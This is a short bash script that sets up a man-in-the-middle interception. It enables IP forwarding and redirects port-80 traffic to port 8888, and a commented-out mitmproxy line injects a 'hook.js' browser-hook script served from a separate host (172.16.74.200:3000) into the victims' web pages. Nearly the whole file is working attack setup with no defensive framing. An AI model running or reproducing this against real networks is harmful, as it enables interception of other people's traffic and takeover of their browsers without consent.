#!/bin/bash
echo "Enable IP forwarding..."
sysctl -w net.ipv4.ip_forward=1
echo "Setup NAT 80->8888"
iptables -t nat -A PREROUTING -i eno16777736 -p tcp --dport 80 -j REDIRECT --to-port 8888
#mitmproxy -p 8888 -T -s "js_inject.py http://172.16.74.200:3000/hook.js"
#echo "Disable NAT..."
#iptables -t nat -F
#echo "Disable IP forwarding..."
#sysctl -w net.ipv4.ip_forward=0
echo "Done!"
